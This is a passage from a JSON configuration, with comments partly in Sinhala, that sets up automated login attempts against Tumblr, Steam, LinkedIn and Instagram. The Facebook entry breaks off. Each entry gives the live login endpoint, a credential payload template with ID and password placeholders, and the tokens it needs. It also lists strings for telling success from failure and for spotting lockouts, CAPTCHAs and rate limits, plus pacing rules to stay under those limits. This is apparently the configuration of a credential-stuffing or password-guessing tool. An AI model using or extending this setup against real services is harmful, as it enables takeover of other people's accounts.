      "token_note": "tokens/tumblr.json ඕන",
      "failure_markers": ["incorrect", "invalid"],
      "success_markers": ["redirect_url"],
      "lockout_markers": ["too many", "rate limit", "captcha"],
      "rate": {"max_per_minute": 3, "delay_min": 5, "delay_max": 10, "lockout_after": 3, "on_lockout": "abort", "cooldown_seconds": 600}
    }
  },
  "steam": {
    "name": "Steam",
    "login": {
      "url": "https://steamcommunity.com/login/dologin/",
      "method": "POST",
      "payload": {"username": "{ID}", "password": "{PASS}", "captchagid": "-1", "rsatimestamp": "{RSATIME}", "twofactorcode": ""},
      "requires_token": true,
      "token_note": "Steam RSA flow එක tokens/steam.json වලින්",
      "failure_markers": ["incorrect password", "invalid password"],
      "success_redirects": ["/"],
      "lockout_markers": ["too many", "captcha", "rate"],
      "rate": {"max_per_minute": 3, "delay_min": 5, "delay_max": 10, "lockout_after": 3, "on_lockout": "abort", "cooldown_seconds": 900}
    }
  },
  "linkedin": {
    "name": "LinkedIn",
    "login": {
      "url": "https://www.linkedin.com/uas/login-submit",
      "method": "POST",
      "payload": {"session_key": "{ID}", "session_password": "{PASS}", "csrfToken": "{TOKEN}", "loginCsrfParam": "{TOKEN}"},
      "requires_token": true,
      "token_note": "LinkedIn csrfToken ඕන (anti-bot නිසා බොහෝ විට block)",
      "failure_markers": ["incorrect", "invalid password"],
      "success_redirects": ["/feed", "/checkpoint"],
      "lockout_markers": ["too many attempts", "captcha", "rate limit"],
      "rate": {"max_per_minute": 3, "delay_min": 5, "delay_max": 10, "lockout_after": 3, "on_lockout": "abort", "cooldown_seconds": 600}
    }
  },
  "instagram": {
    "name": "Instagram",
    "login": {
      "url": "https://www.instagram.com/accounts/login/ajax/",
      "method": "POST",
      "payload": {"username": "{ID}", "enc_password": "#PWD#1:{PASS}", "queryParams": "{}", "optIntoOneTap": "false"},
      "requires_token": true,
      "token_note": "csrftoken + sessionid ඕන (tokens/instagram.json)",
      "failure_markers": ["incorrect", "bad_password"],
      "success_markers": ["authenticated"],
      "lockout_markers": ["challenge_required", "checkpoint_required", "rate limit"],
      "rate": {"max_per_minute": 3, "delay_min": 5, "delay_max": 10, "lockout_after": 2, "on_lockout": "abort", "cooldown_seconds": 900}
    }
  },
  "facebook": {
    "name": "Facebook",
    "login": {
